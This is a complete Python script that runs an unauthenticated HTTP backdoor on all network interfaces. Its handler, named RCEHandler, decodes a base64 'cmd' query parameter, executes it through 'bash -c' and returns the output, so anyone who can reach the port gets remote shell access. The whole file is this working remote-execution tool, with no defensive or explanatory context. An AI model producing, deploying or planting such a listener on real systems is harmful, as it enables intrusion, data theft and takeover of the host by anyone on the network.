#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess
import base64
import sys

DEFAULT_PORT = 54321

class RCEHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        qs = parse_qs(urlparse(self.path).query)
        cmd = qs.get("cmd", [""])[0]
        if not cmd:
            self.send_response(400)
            self.end_headers()
            return
        try:
            decoded = base64.b64decode(cmd).decode()
            out = subprocess.run(["bash", "-c", decoded], capture_output=True, timeout=10)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(out.stdout)
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_PORT
    HTTPServer(("0.0.0.0", port), RCEHandler).serve_forever()
